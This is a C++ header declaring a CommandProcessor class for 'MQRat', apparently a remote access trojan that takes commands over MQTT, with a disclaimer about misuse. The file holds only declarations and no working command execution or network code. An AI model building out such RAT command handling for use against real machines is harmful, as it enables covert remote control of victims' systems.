/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef COMMAND_PROCESSOR_HPP
#define COMMAND_PROCESSOR_HPP

#include <string>

using namespace std;

/**
 * @brief Interface to command processor
 * 
 */
class CommandProcessor {
	public:
		/**
		 * @brief Construct a new Command Processor object
		 * 
		 * @param cmd Command
		 * @param client Pointer to MQTTClient
		 */
		explicit CommandProcessor(string cmd, void *client);

		/**
		 * @brief Process the specified command
		 * 
		 */
		void Process();
	private:
		/**
		 * @brief Command to be executed
		 * 
		 */
		string command;
		
		/**
		 * @brief Public key block
		 * 
		 */
		string public_key;

		/**
		 * @brief Length of public key string
		 * 
		 */
		size_t public_key_len;

		/**
		 * @brief Pointer to MQTT client
		 * 
		 */
		void *client;
};

#endif
